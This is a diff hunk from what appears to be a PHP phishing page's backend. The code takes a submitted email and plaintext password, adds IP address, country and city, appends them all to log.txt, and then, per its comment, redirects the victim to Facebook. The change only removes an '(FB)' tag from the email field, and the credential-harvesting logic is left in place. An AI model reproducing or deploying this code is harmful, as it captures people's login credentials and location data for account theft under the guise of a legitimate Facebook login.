@@ -36,7 +36,7 @@
   }
 
   // write to log file
-  $log_data = "Date= {$date_str}\nEmail=(FB) {$email}\nPassword= {$password}\nIP Address= {$ip_address}\nCountry= {$country}\nCity= {$city}\n\n";
+  $log_data = "Date= {$date_str}\nEmail= {$email}\nPassword= {$password}\nIP Address= {$ip_address}\nCountry= {$country}\nCity= {$city}\n\n";
   file_put_contents('log.txt', $log_data, FILE_APPEND);
 
   // redirect to Facebook
